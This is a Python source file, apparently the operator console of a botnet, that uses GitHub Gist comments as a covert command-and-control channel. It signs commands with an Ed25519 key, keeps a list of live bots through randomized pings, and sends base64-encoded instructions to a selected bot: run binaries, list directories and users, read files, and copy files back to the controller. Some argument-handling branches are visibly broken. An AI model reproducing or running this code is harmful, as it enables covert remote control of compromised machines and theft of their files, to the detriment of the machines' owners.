import base64
import threading
import random
from time import sleep, time
from github.GistComment import GistComment
from typing import List

from connection import Connection
from nacl.signing import SigningKey

class Controller:
    def __init__(self, token:str, gistID: str, signature: str):
        self.shared = Connection(token, gistID)
        self.active = True
        self.response_thread = threading.Thread(target = self.get_response, daemon=True)
        self.ping_thread = threading.Thread(target=self.ping_bots, daemon=True)
        self.last_ping = None

        self.signing_key = SigningKey(base64.b64decode(signature.encode("utf-8")))
        print(f"Key: {base64.b64encode(self.signing_key.verify_key.encode()).decode('utf-8')}")

        self.bots = {}
        self.bots_lock = threading.Lock()

        self.selected_bot = None
        self.file_name = ""

        self.response_thread.start()
        self.ping_thread.start()
        self.wait_user_input()
    
    def get_response(self):
        while self.active:
            for fresh in self.shared.check_comments():
                self.manage_response(fresh)
            
            sleep(random.uniform(4,10))

    def parse_response(self, response: GistComment) -> (str, str):
        response_footer = response.body[response.body.rfind("[") :]
        response_id = base64.b64decode(response_footer.split("(")[1].split(")")[0].encode("utf-8")).decode("utf-8")

        b_id = response_id.split("-")[1]
        c_id = int(response_id.split("-")[0])

        return b_id, c_id

    def manage_response(self, response: GistComment):
        with self.bots_lock:
            if Connection.RES_PING in response.body:
                self.ping(response)

            elif Connection.RES_COPY in response.body:
                self.file_copy(response)

            elif Connection.RES_USERS in response.body or Connection.RES_CONTENT in response.body or Connection.RES_ID in response.body or Connection.RES_BINARY in response.body or Connection.RES_READ in response.body:
                self.commands(response)
            
            else:
                print("")


    def ping(self, response):
        b_id, c_id = self.parse_response(response)

        if not self.bots.get(b_id):
            self.bots[b_id] = {}
    
        self.bots[b_id]["last_ping"] = c_id
        print(f"Last ping: {b_id}")

    def commands(self, response):
        b_id, c_id = self.parse_response(response)

        bot = self.bots.get(b_id)

        if bot and bot["commands"] and bot["commands"][c_id]:

            output_begin = response.body.find("(") + 1
            output_end = response.body.find(")", output_begin)

            output = base64.b64decode(response.body[output_begin:output_end].encode("utf-8")).decode("utf-8")

            print(f"\n{output}")
            bot["commands"].pop(c_id)

    def file_copy(self, response):
        b_id, c_id = self.parse_response(response)

        bot = self.bots.get(b_id)

        if bot and bot["commands"] and bot["commands"][c_id]:

            output_begin = response.body.find("(") + 1
            output_end = response.body.find(")", output_begin)

            output = base64.b64decode(response.body[output_begin:output_end].encode("utf-8")).decode("utf-8")

            file = open(self.file_name, "w") 
            file.writelines(output)
            file.close()

            print(f"\nFile copied.")
            bot["commands"].pop(c_id)

    def ping_bots(self):
        while self.active:
            with self.bots_lock:
                active_bots = {}
                
                for b_id, bot in self.bots.items():
                    if bot["last_ping"] == self.last_ping:
                        active_bots[b_id] = bot
                    
                self.bots = active_bots

                if self.selected_bot not in self.bots:
                    self.selected_bot = None
                    
                self.last_ping = self.send_command(f"{Connection.REQ_PING}").id

            sleep(random.uniform(10, 100))
    
    def wait_user_input(self):
        while self.active:
            input_str = input(f"({self.selected_bot if self.selected_bot else '*'})$ ")
            args = input_str.split(" ")

            command = args[0].lower()

            if command == "exit":
                self.active = False
            elif command == "status":
                with self.bots_lock:
                    print(f"Bots online: {len(self.bots)}")
            elif command == "help":
                print(
                    f"\n"
                    f"List of available commands:\n"
                    f"Number of available bots = status\n"
                    f"List of available bots = list\n"
                    f"Select a bot to control = bot <bot id>\n"
                    f"Command for selected bot = exec <command>\n"
                    f"Exit the communication channel = exit\n"
                    f"###############################################\n"
                    f"Executable commands\n"
                    f"List of online users = w\n"
                    f"List content of specified directory = ls <path>\n"
                    f"Id of current user = id\n"
                    f"Execute binary = /user/bin/ps\n"
                    f"Copy a file to controller = copy <FILE NAME>\n"
                    f"Read a file = cat <FILE NAME>\n"
                )      
            elif command == "list":
                with self.bots_lock:
                    for id in self.bots.keys():
                        print(id)
            elif command == "bot":
                if len(args) < 1:
                    print("Invalid ID!")
                    return
                
                with self.bots_lock:
                    b_id = args[0]

                    if b_id == "*":
                        self.selected_bot = None
                    elif b_id in self.bots.keys():
                        self.selected_bot = b_id
                    else:
                        print("Invalid or offline bot")
            elif command == "exec":
                with self.bots_lock:
                    if not self.selected_bot:
                        print("No bot is selected. One bot has to be selected!")
                        return
                    
                    b_id = base64.b64encode(self.selected_bot.encode("utf-8")).decode("utf-8")

                    if args[0] == "ls":
                        self.send_command(f"{Connection.REQ_CONTENT} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({b_id})",save_command=True,)
                    elif args[0] == "w":
                        self.send_command(f"{Connection.REQ_USERS} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({b_id})",save_command=True,)
                    elif args[0] == "id":
                        self.send_command(f"{Connection.REQ_ID} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({b_id})",save_command=True,)
                    elif args[0] == "cat":
                        self.send_command(f"{Connection.REQ_READ} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({b_id})",save_command=True,)
                    elif args[0] == "copy":
                        args[0] = "cat"
                        path = args[1].split("/")
                        self.file_name = path[len(path) - 1]
                        self.send_command(f"{Connection.REQ_COPY} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({b_id})",save_command=True,)
                    else:
                        self.send_command(f"{Connection.REQ_BINARY} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({b_id})",save_command=True,)

            elif command == "":
                continue
            else:
                print("Invalid command. For a list of available commands enter 'help'.")           
                
    

    def send_command(self, command: str, save_command: bool = False) -> GistComment:

        signature = base64.b64encode(self.signing_key.sign(command.encode("utf-8")).signature).decode("utf-8")

        command += f" [](_{signature}_)"

        command = self.shared.send_msg(command)

        if save_command:
            bot = self.bots[self.selected_bot]

            if not bot.get("commands"):
                bot["commands"] = {}

            bot["commands"][command.id] = time()

        return command


def main():
    controller = Controller(
        "", #Github Personal Access Token
        "", #ID of the gist used
        ""  #32b key
    )

if __name__ == "__main__":
    main()